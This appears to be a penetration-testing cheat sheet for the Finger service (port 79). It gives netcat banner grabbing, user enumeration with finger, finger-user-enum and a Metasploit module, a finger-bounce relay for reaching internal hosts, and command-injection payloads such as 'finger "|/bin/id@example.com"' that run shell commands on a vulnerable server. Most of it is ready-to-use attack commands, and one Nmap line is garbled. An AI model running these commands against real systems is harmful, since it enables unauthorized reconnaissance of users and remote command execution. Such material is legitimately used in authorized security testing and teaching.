**The Finger program/service is utilized for retrieving details about computer users. Typically, the information provided includes the user's login name, full name, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity (idle time), the last instance mail was read by the user, and the contents of the user's plan and project files.**

**Enumeration**
**Banner Grabbing/Basic connection**
```
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```
**User enumeration**
```
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```
**Alternatively you can use finger-user-enum from pentestmonkey**
```
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```
**Nmap execute a script for doing using default scripts**
**Metasploit uses more tricks than Nmap**
```
use auxiliary/scanner/finger/finger_users
```
**Command execution**
```
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
**Finger Bounce**
**Use a system as a finger relay**
```
finger user@host@victim
finger @internal@external
```
